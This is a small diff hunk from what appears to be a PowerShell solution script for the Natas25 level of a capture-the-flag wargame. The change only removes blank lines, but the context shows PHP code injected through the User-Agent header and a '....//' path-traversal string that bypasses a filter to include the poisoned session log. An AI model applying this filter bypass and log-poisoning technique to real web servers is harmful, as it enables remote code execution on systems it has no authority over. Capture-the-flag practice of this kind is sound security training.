@@ -50,8 +50,6 @@ FilterNatasHTML -responseStr $response.Content
 
 write-host "USER_AGENT php injected"
 
-
-
 $param = "....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_$phpsessid.log"
 $param
 $encodedParam = [uri]::EscapeDataString($param)
